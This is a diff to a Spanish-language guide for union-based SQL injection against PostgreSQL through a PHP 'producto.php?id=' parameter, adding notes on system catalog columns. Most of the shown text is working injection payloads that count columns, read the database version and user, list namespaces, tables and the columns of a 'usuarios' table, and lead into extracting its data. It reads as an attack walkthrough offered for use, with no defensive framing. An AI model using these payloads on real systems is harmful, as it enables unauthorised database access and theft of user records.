@@ -5,6 +5,8 @@ GUIA PARA INYECCION EN POSTGRESQL
 	../producto.php?id=-1' union select null -- 
 	../producto.php?id=-1' union select null, null, null
 	
+	en este caso seria 4 campos (union select null, null, null, null)
+	
 2- Una vez reconocemos la cantidad de columnas, averiguamos la version de la bbdd, el nombre de la bd actual y el usuario actual 
 	
 	../producto.php?id=-1' union select null,version(),current_database()||'<p>'||user,null --'
@@ -20,16 +22,23 @@ GUIA PARA INYECCION EN POSTGRESQL
 	../producto.php?id='-1' union select null, nspname,null, null from pg_namespace order by 1 limit 1 offset 2 --'
 
 	.. hasta offset 6, en este caso.
+	
+	**pg_namespace lista los namespace sde la bdd. El nombre de cada uno de ellos viene dado por la columna nspname
 
 5- Una vez detectado el NameSpace que queremos atacar, obtenemos informacion acerca de sus tablas
 
 	../productos.php?id='-1' UNION SELECT null, relname, null, null FROM pg_class, pg_namespace WHERE pg_class.relnamespace=pg_namespace.oid
 				 AND nspname='public' AND relkind='r' ORDER BY 1 LIMIT 1 OFFSET 0 --'
+				 
+				 
+	**relname = nombre de la relacion // relkind = tipo de relacion, para las tables vale 'r' // relnamespace = el OID del namespace al que pertence la tabla. Todo 	objeto en postgreSQL tiene un identificador denominador OID que opera a nivel interno como clave principal ¡.
 
 6- Una vez detectada la tabla que nos interesa, obtenemos informacion acerca de sus columnas
 
 	../productos.php?id='-1' union select null, attname,typname,null from pg_class, pg_namespace, pg_attribute, pg_type where attnum=2
-				 and pg_type.oid=atttypid and attrelid=pg_class.oid and relname='usuarios' and pg_class.relnamespace=pg_namespace.oid and nspname='public' --'
+				 and pg_type.oid=atttypid and attrelid=pg_class.oid and relname='usuarios' and pg_class.relnamespace=pg_namespace.oid and 					nspname='public' --'
+				 
+	** attrelid = el oid de la relacion a la que pertenece la columna // atttypid = el oide del tipo de datos de la columna. se almacena en la tabla pg_type en la 		que el nombre viene dado por la columna "typname". // attnum = posicion de la columna. // attname=nombre de la columna
 
 7- Ya tenemos los campos de la tabla de los cuales queremos substraer la información, ahora los explotamos
 	
